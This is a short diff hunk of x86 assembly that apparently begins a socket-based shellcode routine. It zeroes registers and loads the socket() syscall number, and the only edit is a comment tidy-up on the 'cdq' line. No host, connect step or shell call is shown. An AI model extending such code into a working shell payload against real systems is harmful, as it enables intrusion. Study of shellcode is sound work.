@@ -229,7 +229,7 @@ _start:
 	xor eax, eax       ; May also sub OR mul for zeroing out
 	xor ebx, ebx       ; Clearing out EBX 
 	xor ecx, ecx       ; Clearing out ECX
-	cdq ; xor edx, edx ; Clearing out EDX
+	cdq                ; Clearing out EDX
 
 	; Syscall for socket() = 359 OR 0x167, loading it in AX
 	mov ax, 0x167
